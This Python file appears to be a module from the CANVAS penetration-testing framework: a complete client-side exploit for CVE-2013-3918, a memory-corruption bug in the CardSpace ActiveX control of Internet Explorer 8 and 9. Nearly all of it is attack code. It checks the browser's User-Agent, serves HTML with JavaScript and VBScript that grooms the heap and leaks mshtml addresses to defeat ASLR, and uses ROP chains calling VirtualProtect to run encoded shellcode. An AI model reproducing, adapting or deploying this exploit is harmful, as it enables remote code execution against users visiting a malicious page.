#! /usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2009
# http://www.immunityinc.com/CANVAS/ for more information

from __future__ import with_statement
import sys
if "." not in sys.path:
    sys.path.append(".")

from exploitutils import *
from httpclientside import httpclientside

from libs.spkproxy import header, body

NAME                            = "ie_cardspaceclaimcollection"
DESCRIPTION                     = "Clientside exploit for CardSpaceClaimCollection ActiveX Array's underflow"
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "Microsoft"
DOCUMENTATION["Repeatability"]  = "Single"
DOCUMENTATION["References"]     = "http://technet.microsoft.com/en-us/security/bulletin/ms13-090"
DOCUMENTATION["CVE Name"]       = "CVE-2013-3918"
DOCUMENTATION["CVE Url"]        = "http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2013-3918"
DOCUMENTATION["NOTES"]          = """
 - This exploits leaks a vtable pointer of a CTable object in order to bypass ASLR
 - We also leak the shellcode's address so there's no need for heap spraying

This exploit has been tested on:
- Windows 7 Professional (x86) on IE 9 mshtml.dll version 9.00.8112.16457.
- Windows 7 Home Basic (x64) on IE 9 32 bits mshtml.dll version 9.00.8112.16421. 
- Windows 7 Ultimate (x86) on IE 8 mshtml.dll version 8.00.7600.16385.
"""

VERSION                         = "1.0"
PROPERTY                        = {}
PROPERTY['TYPE']                = "Exploit"
PROPERTY['SITE']                = "Clientside"
PROPERTY['ARCH']                = [ ["Windows"] ]
PROPERTY['VERSION']             = []
PROPERTY['DELIVERY']            = 'HTTP'

class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)
        self.version        = 0
        self.name           = NAME
        self.badstring      = '\x00'
        # filename is used in the actual http server
        self.filename       = "".join( [ random.choice(string.uppercase) for x in range(8) ] ) + "00.html"
        self.vtable_offset = {'x86' : 0x003ca2e0, 'x64' : 0x003ca610}
	
    def is_vulnerable(self, info_dict):
        ua = info_dict['user_agent']
        
        if 'MSIE 9.0' in ua or 'MSIE 8.0' in ua:
            return 100
        else:
            self.log("Not IE 8/9 - possibly vulnerable, but not to the current exploit version")
            return 0

    def createAndEncodeShellcode(self):
        self.createWin32ClientSideShellcode()
        self.shellcode = self.intel_encode(self.badstring, self.shellcode)
	
    def urlencode(self, buf):
        tmp = ""
        i = 0
        if len(buf) % 2 == 0:
            for c in buf:
                if i == 1:
                    b = ord(c)
                    tmp+="%%u%2.2x%2.2x"%(b,a)
                    i = 0
                else:
                    a = ord(c)
                    i += 1 
            return tmp
        else:
            for c in buf[:-1]:
                if i == 1:
                    b = ord(c)
                    tmp+="%%u%2.2x%2.2x"%(b,a)
                    i = 0
                else:
                    a = ord(c)
                    i += 1 
            tmp += "%%u%2.2x"%(ord(buf[-1]))
            return tmp
	
    def get_x86_rop(self):
        rop = """
            virtual_protect = mshtml_base + 0x00001500;
            ret_address = mshtml_base + 0x00220634;
            neg_eax = mshtml_base + 0x000f287e;
            push_esp_pop_esi = mshtml_base + 0x000fed26;
            
            xchg_ecx_esp = mshtml_base + 0x0016dbd4; // pivot
            xchg_eax_ecx = mshtml_base + 0x0004986b;
            xchg_eax_ebx = mshtml_base + 0x000f7e8b;
            xchg_eax_edx = mshtml_base + 0x000c800c;
            xchg_eax_esi = mshtml_base + 0x0004c066;

            pop_eax = mshtml_base + 0x0000420a;
            pop_ebx = mshtml_base + 0x00011684;
            pop_ecx = mshtml_base + 0x00058fba;
            pop_esi = mshtml_base + 0x00006ef8;
            pop_ebp = mshtml_base + 0x00006ef8;

            nop = mshtml_base + 0x0000420b;

            mov_eax_edx = mshtml_base + 0x001aff1a; // mov eax,edx
            mov_eax_ecx = mshtml_base + 0x001706a1; // mov [eax],ecx
            mov_eax_esi = mshtml_base + 0x000e1aa0; //mov [eax],esi
            mov_eax_esi_val = mshtml_base + 0x000c481f; // mov eax,esi
            mov_eax_ecx_val = mshtml_base + 0x00161957; // mov eax,ecx
            mov_eax_ecx_ecx_ptr = mshtml_base + 0x0012fc53; // mov eax, [ecx]
            mov_eax_eax = mshtml_base + 0x000e737e; // mov eax,[eax]
            sub_eax_ecx = mshtml_base + 0x004d5fd0;
            call_eax = mshtml_base + 0x00002891;

            rop = junk;
            rop += myescape(nop);
            rop += junk;
            rop += junk;
            rop += junk;
            rop += myescape(nop);
            rop += myescape(pop_eax);

            rop += myescape(xchg_ecx_esp);          // xchg ecx,esp # sub al, [eax] # pop ebp # ret 0xc
            rop += myescape(push_esp_pop_esi);
            rop += myescape(xchg_eax_esi);
            rop += myescape(xchg_eax_edx);

            rop += myescape(pop_esi);
            rop += myescape(0xfffff800);     
            rop += myescape(xchg_eax_esi);
            rop += myescape(neg_eax);
            rop += myescape(xchg_eax_esi);

            rop += myescape(pop_ebx);
            rop += myescape(0xffffffc0);    
            rop += myescape(xchg_eax_ebx);
            rop += myescape(neg_eax);
            rop += myescape(xchg_eax_ebx);

            rop += myescape(xchg_eax_edx);
            rop += myescape(pop_ecx);
            rop += myescape(0xffffff78);
            rop += myescape(sub_eax_ecx);
            rop += myescape(xchg_eax_ecx);
            rop += myescape(mov_eax_ecx_val);
            rop += myescape(mov_eax_eax);
            rop += myescape(mov_eax_eax);
            rop += myescape(xchg_eax_ecx);
            rop += myescape(mov_eax_ecx);

            rop += myescape(pop_ecx);
            rop += myescape(0xfffffff4);
            rop += myescape(sub_eax_ecx);
            rop += myescape(mov_eax_esi);
   
            rop += myescape(pop_ecx);
            rop += myescape(0xfffffffc);
            rop += myescape(sub_eax_ecx);            
            rop += myescape(xchg_eax_esi);
            rop += myescape(xchg_eax_ebx);
            rop += myescape(xchg_eax_ecx);
            rop += myescape(mov_eax_esi_val);
            rop += myescape(mov_eax_ecx);
        
            rop += myescape(virtual_protect);     
            rop += myescape(ret_address);     
            rop += myescape(shellcode_address);     
            rop += myescape(0xaaaaaaaa);     
            rop += myescape(0xbbbbbbbb);     
            rop += myescape(writable_address);     
            rop += myescape(nop);
            rop += myescape(nop);
            rop += myescape(nop);
            rop += myescape(nop);
            rop += myescape(nop);
            rop += myescape(nop);

            rop += myescape(pop_eax); 
            rop += myescape(shellcode_address);     
            rop += myescape(call_eax);     	
        """
        return rop
    
    def get_x64_rop(self):
        rop = """
            virtual_protect = mshtml_base + 0x000014f0;
            ret_address = mshtml_base + 0x00a88a0d;
            neg_eax = mshtml_base + 0x000f288d;
            push_esp_pop_esi = mshtml_base + 0x000fedd6;
	            
            push_ecx_pop_esp = mshtml_base + 0x004e3cbf;// pivot
            xchg_eax_ecx = mshtml_base + 0x000498fd;
            xchg_eax_ebx = mshtml_base + 0x00187584;
	            xchg_eax_edx = mshtml_base + 0x0014d3ef;
	            xchg_eax_esi = mshtml_base + 0x0037d6d2;
	            
	            pop_eax = mshtml_base + 0x000041f2;
	            pop_ebx = mshtml_base + 0x000060c8;
	            pop_ecx = mshtml_base + 0x000093c4;
	            pop_esi = mshtml_base + 0x00002453;
	            
	            nop = mshtml_base + 0x00002454;
	            
	            mov_eax_ecx = mshtml_base + 0x001702b1; // mov [eax],ecx
	            mov_eax_esi = mshtml_base + 0x000e1a44; //mov [eax],esi
	            mov_eax_esi_val = mshtml_base + 0x0001937d; // mov eax,esi
	            mov_eax_ecx_val = mshtml_base + 0x0001c950; // mov eax,ecx
	            mov_eax_ecx_ecx_ptr = mshtml_base + 0x0012fd8f; // mov eax, [ecx]
	            mov_eax_eax = mshtml_base + 0x000e731e; // mov eax,[eax]
	            sub_eax_ecx = mshtml_base + 0x4d7d3c;
	            call_eax = mshtml_base + 0x00002879;
	
	            rop = myescape(nop);
	            rop += myescape(nop);
	            rop += myescape(nop);
	            rop += myescape(nop);
	            rop += myescape(nop);
	            rop += myescape(nop);
	            rop += myescape(pop_eax);
	            
	            rop += myescape(push_ecx_pop_esp);          // xchg ecx,esp # sub al, [eax] # pop ebp # ret 0xc
	            rop += myescape(push_esp_pop_esi);
	            rop += myescape(xchg_eax_esi);
	            rop += myescape(xchg_eax_edx);
	
	            rop += myescape(pop_esi);
	            rop += myescape(0xfffffc00);     
	            rop += myescape(xchg_eax_esi);
	            rop += myescape(neg_eax);
	            rop += myescape(xchg_eax_esi);
	            
	            rop += myescape(pop_ebx);
	            rop += myescape(0xffffffc0);    
	            rop += myescape(xchg_eax_ebx);
	            rop += myescape(neg_eax);
	            rop += myescape(xchg_eax_ebx);
	            
	            rop += myescape(xchg_eax_edx);
	            rop += myescape(pop_ecx);
	            rop += myescape(0xffffff78);
	            rop += myescape(sub_eax_ecx);
	            rop += myescape(xchg_eax_ecx);
	            rop += myescape(mov_eax_ecx_val);
	            rop += myescape(mov_eax_eax);
	            rop += myescape(mov_eax_eax);
	            rop += myescape(xchg_eax_ecx);
	            rop += myescape(mov_eax_ecx);
	            
	            rop += myescape(pop_ecx);
	            rop += myescape(0xfffffff4);
	            rop += myescape(sub_eax_ecx);
	            rop += myescape(mov_eax_esi);
	            
	            rop += myescape(pop_ecx);
	            rop += myescape(0xfffffffc);
	            rop += myescape(sub_eax_ecx);            
	            rop += myescape(xchg_eax_esi);
	            rop += myescape(xchg_eax_ebx);
	            rop += myescape(xchg_eax_ecx);
	            rop += myescape(mov_eax_esi_val);
	            rop += myescape(mov_eax_ecx);
	            
	            rop += myescape(virtual_protect);     
	            rop += myescape(ret_address);     
	            rop += myescape(shellcode_address);     
	            rop += myescape(0xaaaaaaaa);     
	            rop += myescape(0xbbbbbbbb);     
	            rop += myescape(writable_address);     
	            rop += myescape(nop);
	            rop += myescape(nop);
	            rop += myescape(nop);
	            rop += myescape(nop);
	            rop += myescape(nop);
	            rop += myescape(nop);
	            rop += myescape(nop);
	            rop += myescape(nop);
	            rop += myescape(pop_eax); 
	            rop += myescape(shellcode_address);     
	            rop += myescape(call_eax);     	
        """
        return rop
    
    def generate_html_ie8(self):
        html = """
	<html>
	        <body>
	                <object classid="clsid:19916E01-B44E-4E31-94A4-4696DF46157B" id='cardspace'></object>
	
	                <script language='javascript'>
	            
	                        var array = new Array();
	                        var array2 = new Array();
	                        collection = cardspace.requiredClaims;
	                        for(i=0;i<10;i++){
	                                collection.add(i.toString());
	                        }
	
	
	                        var junk = unescape('%%ucafe%%ucafe%%ucafe%%ucafe%%ucafe%%ucafe%%ucafe%%ucafe%%ucafe%%ucafe%%ucafe%%ucafe%%ucafe%%ucafe%%ucafe%%ucafe%%ucafe%%ucafe%%ucafe%%ucafe%%ucafe%%ucafe%%ucafe%%ucafe%%ucafe%%ucafe%%ucafe%%ucafe%%ucafe%%ucafe%%ucafe%%ucafe%%ucafe%%ucafe%%ucafe%%ucafe%%ucafe');
	
	                        
	                        for(i=0;i<8000;i++){
	                                array[i] = document.createElement('form');
	                                array2[i] = junk.substr(0,(0x50-6)/2);
	                        }
	                
	                        for(i=7500;i<8000;i=i+2){
	                                array[i] = null;
	                                CollectGarbage();
	                        }
	                        collection.add(i.toString());
	
	                        index = 0;
	                        for(i=11;i>0;i--){
	                                collection.remove(i);
	                        }
	
	                        for(i=0;i<22;i++){
	                                collection.remove(index);
	                                index--;
	                        }
	                        collection.add('CAFECAFECAFECAFECAFECAFECAFECAFECAFECAFECAFECAFECAFECAFECAFECAFECAFECAFECAFECAFECAFECAFECAFECAFECAFECAFECAFECAFECAFECAFECAFECAFECAFECAFECAFECAFECAFECAFECAFECAFECAFECAFE');
	            var found = false;
	            for(i=0;i<8000;i++){
	                if (array2[i].length > 0x100){
	                    big_str = array2[i];
	                    found = true;
	                }
	            }
	
	
	            mshtml_vtable = big_str.charCodeAt(131)*0x10000 + big_str.charCodeAt(130);
	            mshtml_base = mshtml_vtable - 0x7ba8;
	            index++;
	            for(i=0;i<45;i++){
	                                collection.remove(index);
	                                index--;
	                        }
	            
	            for(i=0;i<20;i++){
	                                collection.add(i.toString());
	                        }
	            collection.add(unescape("%s"));
	            collection.add('BBBBBBBBBBBBBBB');
	            
	            for(i=0;i<8000;i++){
	                if (array2[i].length > 0x100){
	                    big_str = array2[i];
	                    found = true;
	                }
	            }
	            
	            shellcode_address = big_str.charCodeAt(39)*0x10000 + big_str.charCodeAt(38);
	            writable_address = big_str.charCodeAt(41)*0x10000 + big_str.charCodeAt(40);
	
	            junk = myescape(0xffffffff);
	            virtual_protect = mshtml_base + 0x00001308;
	            ret_address = mshtml_base + 0x0017e981;
	            neg_eax = mshtml_base + 0x0000212c  ; 
	            push_esp_pop_eax = mshtml_base + 0x0025d937;
	            
	            push_ecx_pop_esp = mshtml_base + 0x0033eab1;// pivot
	            xchg_eax_esp = mshtml_base + 0x000117ef;
	            xchg_eax_ecx = mshtml_base + 0x00010399;
	            xchg_eax_ebx = mshtml_base + 0x0016e1a3;
	            xchg_eax_edx = mshtml_base + 0x0010c326;
	            xchg_eax_esi = mshtml_base + 0x000cab0e;
	            
	            pop_eax = mshtml_base + 0x0001148d;
	            pop_ebx = mshtml_base + 0x00002e3a;
	            pop_ecx = mshtml_base + 0x00002d8d;
	            pop_esi = mshtml_base + 0x00002c4f;
	            
	            nop = mshtml_base + 0x00002e3b;
	            
	            mov_eax_ecx = mshtml_base + 0x0006a82a; // mov [eax],ecx
	            mov_eax_esi_val = mshtml_base + 0x0007b9ff; // mov eax,esi
	            mov_eax_ecx_val = mshtml_base + 0x0010c51a; // mov eax,ecx
	            mov_eax_ecx_ecx_ptr = mshtml_base + 0x003b6852; // mov eax, [ecx]
	            mov_eax_eax = mshtml_base + 0x00249d89; // mov eax,[eax]
	            sub_eax_ecx = mshtml_base + 0x001f219b;
	            call_eax = mshtml_base + 0x000045b4;
	            
	            rop = myescape(nop);
	            rop += myescape(nop);
	            rop += myescape(nop);
	            rop += myescape(nop);
	            rop += myescape(nop);
	            rop += myescape(pop_eax);
	            rop += myescape(xchg_eax_esp);
	            rop += myescape(nop);
	            rop += myescape(nop);
	            rop += myescape(nop);
	            rop += myescape(nop);
	            rop += myescape(nop);    
	            rop += myescape(pop_eax);
	            rop += myescape(xchg_eax_esp);
	
	            rop += myescape(push_esp_pop_eax);
	            rop += myescape(xchg_eax_edx);
	            
	            rop += myescape(xchg_eax_edx);
	            rop += myescape(pop_ecx);
	            rop += myescape(0xffffff6c);
	            rop += myescape(sub_eax_ecx);
	            
	            rop += myescape(xchg_eax_ecx);
	            
	            rop += myescape(mov_eax_ecx_val);
	            rop += myescape(mov_eax_eax);
	            rop += myescape(mov_eax_eax);
	            rop += myescape(xchg_eax_ecx);
	            rop += myescape(mov_eax_ecx);
	
	            rop += myescape(pop_ebx);
	            rop += myescape(0xfffffc00);    
	            rop += myescape(xchg_eax_ebx);
	            rop += myescape(neg_eax);
	            rop += myescape(xchg_eax_ebx);
	            
	            rop += myescape(pop_ecx);
	            rop += myescape(0xfffffff4);
	            rop += myescape(sub_eax_ecx);            
	            rop += myescape(xchg_eax_esi);
	            rop += myescape(xchg_eax_ebx);
	            rop += myescape(xchg_eax_ecx);
	            rop += myescape(mov_eax_esi_val);
	            rop += myescape(mov_eax_ecx);
	            
	            rop += myescape(pop_ebx);
	            rop += myescape(0xffffffc0);    
	            rop += myescape(xchg_eax_ebx);
	            rop += myescape(neg_eax);
	            rop += myescape(xchg_eax_ebx);
	            
	            rop += myescape(pop_ecx);
	            rop += myescape(0xfffffffc);
	            rop += myescape(sub_eax_ecx);            
	            rop += myescape(xchg_eax_esi);
	            rop += myescape(xchg_eax_ebx);
	            rop += myescape(xchg_eax_ecx);
	            rop += myescape(mov_eax_esi_val);
	            rop += myescape(mov_eax_ecx);
	            
	            rop += myescape(virtual_protect);     
	            rop += myescape(ret_address);     
	            rop += myescape(shellcode_address);     
	            rop += myescape(0xaaaaaaaa);     
	            rop += myescape(0xbbbbbbbb);     
	            rop += myescape(writable_address);     
	            rop += myescape(nop);
	            rop += myescape(nop);
	            rop += myescape(nop);
	            rop += myescape(nop);
	            rop += myescape(nop);
	            rop += myescape(nop);
	            rop += myescape(nop);
	            rop += myescape(nop);
	            rop += myescape(pop_eax); 
	            rop += myescape(shellcode_address);     
	            rop += myescape(call_eax);     
	
	            rop = unescape(rop);
	
	            collection.add(rop.substring(0,rop.length));
	
	            for(i=7999;i>0;i--){
	                if (array[i] != null){
	                    array[i].focus;
	                }
	                        }
	            
	            function myescape(addr) {
	                var str="";
	                str="%%u"+hexa(addr&0xffff)+"%%u"+hexa((addr>>16)&0xffff);
	                return str;
	            }
	            
	            function hexa(val) {
	                var str=new Number(val).toString(16);
	                while (str.length < 4)  str = "0" + str;
	                return str;
	            }
	        </script>  
	
	        </body>
	</html>
	
        """
        html = html % self.urlencode(self.shellcode)
        return html	
    
    def generate_html_ie9(self):
        html = """
	<html>
	        <body>
	                <object classid="clsid:19916E01-B44E-4E31-94A4-4696DF46157B" id='cardspace'></object>
	
	                <script language='javascript'>
	                        var array = new Array();
	                        var array2 = new Array();
	                        collection = cardspace.requiredClaims;
	                        
	                        // The initial array's size is 0x28, we can make it bigger by adding elements
	                        // after the first resize the new array's size is 0x50, we can create
	                        // BSTR with this size, we only add 10 elements, with an extra add the resizing is done
	                        for(i=0;i<10;i++){
	                                collection.add(i.toString());
	                        }
	                        
	                        // Heap will look [TABLE][TABLE][TABLE]....
	                        for(i=0;i<2000;i++){
	                                array[i] = document.createElement('table');
	                                array2[i] = document.createElement('table');
	                        }
	                        
	                        // Heap will look [TABLE][HOLE][TABLE][HOLE]...
	                        for(i=0;i<2000;i++){
	                                array2[i] = null;
	                                CollectGarbage();
	                        }
	                </script>
	        <SCRIPT LANGUAGE="VBScript">
	            Dim fillup_hole(2000)
	
	            For k = 0 To 2000
	                fillup_hole(k) = "CAFECAFECAFECAFECAFECAFECAFECAFEC"
	            Next
	        </script>  
	            
	        <script>
	                        // Heap looks [TABLE][BSTR][TABLE][BSTR]...
	                        // Heap will look near the end of the allocations
	                        // [TABLE][BSTR][HOLE][BSTR][TABLE][BSTR][HOLE][BSTR][HOLE]...
	                        
	                        for(i=1500;i<2000;i=i+2){
	                                array[i] = null;
	                                CollectGarbage();
	                        }
	                        
	                        // This triggers the allocation of the 0x50 sized array
	                        collection.add(i.toString());
	
	                        // Remove all the array elements
	                        index = 0;
	                        for(i=11;i>0;i--){
	                                collection.remove(i);
	                        }
	                        
	                        // Remove elements to point to the BSTR size above our array
	                        for(i=0;i<22;i++){
	                                collection.remove(index);
	                                index--;
	                        }
	                        
	                        // Overwrite the size with a pointer to this string, now our size is big :>
	                        collection.add('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
	        
	        </script>
	        <SCRIPT LANGUAGE="VBScript">
	            Dim big_str
	            For k = 0 To 2000
	                If Len(fillup_hole(k)) > 33 Then
	                    big_str = Left(fillup_hole(k),150)
	
	                End If
	            Next
	
	        </script>  
	        <script>
	            // Found our string, Left() is necesary cause VBScript assigments triggers
	            // a memcpy operation with the new size of our string, which is too big.
	            
	            mshtml_vtable = big_str.charCodeAt(131)*0x10000 + big_str.charCodeAt(130);
	            mshtml_base = mshtml_vtable - %d;
	            
	            // We are going to leak the shellcode address and writable address for VirtualProtect as well
	            index++;
	            for(i=0;i<45;i++){
	                                collection.remove(index);
	                                index--;
	                        }
	            
	            for(i=0;i<20;i++){
	                                collection.add(i.toString());
	                        }
	            
	            collection.add(unescape("%s"));
	            collection.add('BBBBBBBBBBBBBBB');
	            
	
	        </script>
	        <SCRIPT LANGUAGE="VBScript">
	            Dim big_str
	            For k = 0 To 2000
	                If Len(fillup_hole(k)) > 33 Then
	                    big_str = Left(fillup_hole(k),150)
	                End If
	            Next
	        </script>
	        
	        <script>  
	        
	            // Leak the address and build the ROP
	            shellcode_address = big_str.charCodeAt(39)*0x10000 + big_str.charCodeAt(38);
	            writable_address = big_str.charCodeAt(41)*0x10000 + big_str.charCodeAt(40);
	            junk = myescape(0xffffffff);
	            
	            %s
	            
	            rop = unescape(rop);

	            // This overwrites a pointer that will gives us code execution
	            collection.add(rop.substring(0,rop.length));
	            // Trigger the pointer
	            for(i=0;i<2000;i++){
	                if (array[i] != null){
	                    array[i].click();
	                }
	                                if (array2[i] != null){
	                    array2[i].click();
	                }
	                        }
	            
	            function myescape(addr) {
	                var str="";
	                str="%%u"+hexa(addr&0xffff)+"%%u"+hexa((addr>>16)&0xffff);
	                return str;
	            }
	            
	            function hexa(val) {
	                var str=new Number(val).toString(16);
	                while (str.length < 4)  str = "0" + str;
	                return str;
	            }
	        </script>  
	
	        </body>
	</html>
	
        """
        html = html % (self.vtable, self.urlencode(self.shellcode), self.rop)
        return html
    
    def makesploit(self, clientheader, clientbody):
        h = header('SERVER')
        b = body()
        ua = clientheader.getHeaderValue('User-Agent')
	
        if self.plugin_info:
            self.log("We got a plugin info for this target - thanks clientd!")
            info_dict   = self.plugin_info
            user_agent  = info_dict['user_agent']
        else:
            user_agent = clientheader.getStrValue(['User-Agent'])

        if 'WOW64' in user_agent:
            self.rop = self.get_x64_rop()
            self.vtable = self.vtable_offset['x64']
            self.log('The target is running 32 bits IE on x64')
        else:
            self.rop = self.get_x86_rop()
            self.vtable = self.vtable_offset['x86']
		 
        if clientheader.URL.endswith(self.filename):
            self.log('Serving HTML file')
	    
            self.createAndEncodeShellcode()
        
            if "MSIE 8.0" in user_agent:		
                html = self.generate_html_ie8()
            else:
                html = self.generate_html_ie9()
		
            b.setBody(html)
            h.addHeader('Content-Type','text/html')

        elif clientheader.URL.count("exit"):
            self.log('Max retries reached. Exploit failed.')
            h.status='302'
            h.addHeader('Location',"http://www.google.com")
            h.addHeader('Content-Type','text/html')
            return h, b
        else:
            self.log('Redirecting to self')
            h.status='302'
            h.addHeader('Location', self.filename)
            h.addHeader('Content-Type','text/html')

        return h, b

    def run(self):
        self.log('Run from inside ClientD')
        return 1

 
if __name__ == '__main__':
    exp = theexploit()
    ret = standard_callback_commandline(exp)
    if ret not in [0, 1, None]:
        ret.interact()
